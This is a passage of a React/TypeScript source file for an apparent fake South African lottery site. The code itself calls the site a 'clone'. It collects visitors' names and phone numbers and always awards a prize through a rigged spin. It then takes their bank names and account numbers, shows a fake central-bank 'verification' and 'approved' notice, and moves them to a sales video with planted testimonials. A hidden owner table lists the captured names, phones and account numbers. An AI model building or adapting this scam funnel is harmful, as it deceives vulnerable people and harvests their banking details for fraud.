            onChange={(e) => setSearchTerm(e.target.value)}
            className="w-full px-3 py-1.5 text-xs border border-gray-300 rounded-md focus:border-[#1d4ea8] outline-none bg-white"
          />
        </div>

        <div className="flex-1 overflow-auto p-4 text-xs">
          {loading ? (
            <div className="py-12 text-center text-gray-500">Loading database records...</div>
          ) : filtered.length === 0 ? (
            <div className="py-12 text-center text-gray-500">
              No entries recorded yet. Submissions made on the clone will immediately appear here.
            </div>
          ) : (
            <table className="w-full border-collapse">
              <thead>
                <tr className="bg-gray-100 text-left text-gray-700 border-b border-gray-200 font-semibold">
                  <th className="p-2">Date</th>
                  <th className="p-2">Name</th>
                  <th className="p-2">Phone</th>
                  <th className="p-2">Prize</th>
                  <th className="p-2">Lucky #</th>
                  <th className="p-2">Bank</th>
                  <th className="p-2">Account Number</th>
                  <th className="p-2">Status</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-200">
                {filtered.map((item) => (
                  <tr key={item.id} className="hover:bg-blue-50/50">
                    <td className="p-2 text-gray-500 whitespace-nowrap">
                      {new Date(item.createdAt).toLocaleDateString()} {new Date(item.createdAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                    </td>
                    <td className="p-2 font-bold text-gray-900">{item.name}</td>
                    <td className="p-2 font-mono text-gray-700">{item.phone}</td>
                    <td className="p-2 text-blue-700">{item.desiredPrize?.label}</td>
                    <td className="p-2 font-mono font-bold text-amber-600">{item.luckyNumber ?? '-'}</td>
                    <td className="p-2 font-semibold text-gray-800">{item.bank || '-'}</td>
                    <td className="p-2 font-mono text-gray-700">{item.accountNumber || '-'}</td>
                    <td className="p-2">
                      <span className="px-2 py-0.5 rounded-full text-[10px] font-bold bg-green-100 text-green-800">
                        {item.status}
                      </span>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          )}
        </div>
      </div>
    </div>
  );
}

// Main App Component
export default function App() {
  const [step, setStep] = useState<'prizes' | 'spin' | 'bank' | 'processing' | 'approved' | 'vsl'>('prizes');
  const [name, setName] = useState('');
  const [phone, setPhone] = useState('');
  const [selectedPrize, setSelectedPrize] = useState<PrizeOption | null>(null);
  const [entryId, setEntryId] = useState<string | null>(null);
  const [bank, setBank] = useState('');
  const [accountNumber, setAccountNumber] = useState('');
  const [accountHolder, setAccountHolder] = useState('');
  const [ageConfirmed, setAgeConfirmed] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [comments, setComments] = useState<CommentData[]>(INITIAL_COMMENTS);
  const [jackpot, setJackpot] = useState('R 150,000,000');
  const [showAdmin, setShowAdmin] = useState(false);

  // Check 18+ verification in localStorage on mount
  useEffect(() => {
    if (typeof window !== 'undefined') {
      const stored = localStorage.getItem('ageConfirmed18');
      if (stored === '1') {
        setAgeConfirmed(true);
      }
    }
  }, []);

  // Fetch initial comments and jackpot from database API
  useEffect(() => {
    fetch('/api/comments')
      .then((res) => res.json())
      .then((data) => {
        if (Array.isArray(data) && data.length) {
          setComments(data);
        }
      })
      .catch(() => {
        // Fallback already in place
      });

    fetch('/api/stats')
      .then((res) => res.json())
      .then((data) => {
        if (data.jackpot) setJackpot(data.jackpot);
      })
      .catch(() => {});
  }, []);

  function handleAgeConfirm() {
    if (typeof window !== 'undefined') {
      localStorage.setItem('ageConfirmed18', '1');
    }
    setAgeConfirmed(true);
  }

  // Handle Step 1 Submit -> save entry in database
  async function handleNextFromPrizes() {
    if (!name.trim() || !phone.trim() || !selectedPrize) return;
    setIsSubmitting(true);

    try {
      const res = await fetch('/api/entries', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          name: name.trim(),
          phone: phone.trim(),
          desiredPrize: selectedPrize,
        }),
      });
      const data = await res.json();
      if (data?.entry?.id) {
        setEntryId(data.entry.id);
      }
    } catch (err) {
      console.warn('API sync warning:', err);
    } finally {
      setIsSubmitting(false);
      setStep('spin');
      window.scrollTo({ top: 0, behavior: 'smooth' });
    }
  }

  // Handle Step 2 Win -> update draw results in database
  async function handleWinFromSpin(luckyNumber: number, drawnNumbers: number[]) {
    if (entryId) {
      try {
        await fetch(`/api/entries/${entryId}/draw`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            luckyNumber,
            drawnNumbers,
            wonPrize: WON_PRIZE,
          }),
        });
      } catch (err) {
        console.warn('Draw sync warning:', err);
      }
    }
    setStep('bank');
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }

  // Handle Step 3 Bank Submit -> update bank details in database
  async function handleSubmitBank() {
    if (!bank || !accountNumber.trim() || !accountHolder.trim()) return;
    setIsSubmitting(true);

    if (entryId) {
      try {
        await fetch(`/api/entries/${entryId}/bank`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            bank,
            accountHolder: accountHolder.trim(),
            accountNumber: accountNumber.trim(),
          }),
        });
      } catch (err) {
        console.warn('Bank sync warning:', err);
      }
    }

    setIsSubmitting(false);
    setStep('processing');
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }

  // Handle Step 4 Finished -> approved
  function handleProcessingDone() {
    if (entryId) {
      fetch(`/api/entries/${entryId}/status`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ status: 'approved' }),
      }).catch(() => {});
    }
    setStep('approved');
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }

  // Handle Step 5 Continue -> VSL
  function handleContinueToVSL() {
    if (entryId) {
      fetch(`/api/entries/${entryId}/status`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ status: 'watching_vsl' }),
      }).catch(() => {});
    }
    setStep('vsl');
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }

  // Handle Like Button click -> increment in database and state
  async function handleLikeComment(id: string) {
    setComments((prev) =>
      prev.map((c) => (c.id === id ? { ...c, likes: c.likes + 1 } : c))
    );

    try {
      await fetch(`/api/comments/${id}/like`, { method: 'POST' });
    } catch (err) {
      console.warn('Like sync failed:', err);
    }
  }

  return (
    <div className="min-h-screen bg-[#eef3fb] font-sans text-[14px] flex flex-col justify-between selection:bg-[#1d4ea8] selection:text-white">
      {/* 18+ Age Verification Modal */}
      {!ageConfirmed && <AgeModal onConfirm={handleAgeConfirm} />}

      {/* Main Content Area */}
      <div className="w-full flex-1">
        {/* Header */}
        <Header jackpot={jackpot} />

        {/* Step 1: Prizes & Lead Generation */}
        {step === 'prizes' && (
          <StepPrizes
            name={name}
            phone={phone}
            setName={setName}
            setPhone={setPhone}
            selected={selectedPrize}
            setSelected={setSelectedPrize}
            onNext={handleNextFromPrizes}
            isLoading={isSubmitting}
          />
        )}

        {/* Step 2: Interactive Lucky Draw */}
        {step === 'spin' && selectedPrize && (
          <StepSpin
            name={name}
            prize={selectedPrize}
            onWin={handleWinFromSpin}
          />
        )}

        {/* Step 3: South African Bank Account Form */}
        {step === 'bank' && (
          <StepBank
            prize={WON_PRIZE}
            bank={bank}
            setBank={setBank}
            accountNumber={accountNumber}
            setAccountNumber={setAccountNumber}
            accountHolder={accountHolder}
            setAccountHolder={setAccountHolder}
            defaultHolder={name}
            onSubmit={handleSubmitBank}
            isLoading={isSubmitting}
          />
        )}

        {/* Step 4: Verification / SARB Process Animation */}
        {step === 'processing' && (
          <StepProcessing
            bank={bank}
            onDone={handleProcessingDone}
          />
        )}

        {/* Step 5: Bank Approved Notice */}
        {step === 'approved' && (
          <StepApproved
            bank={bank}
            name={name}
            prize={WON_PRIZE}
            onContinue={handleContinueToVSL}
          />
        )}

        {/* Step 6: VSL Video Page & Testimonials */}
        {step === 'vsl' && (
          <StepVSL
            name={name}
            bank={bank}
            prize={WON_PRIZE}
            comments={comments}
            onLike={handleLikeComment}
          />
        )}
      </div>

      {/* Footer */}
      <Footer onOpenAdmin={() => setShowAdmin(true)} />

      {/* Site Owner Database Modal */}
      {showAdmin && <AdminModal onClose={() => setShowAdmin(false)} />}
    </div>
  );
}
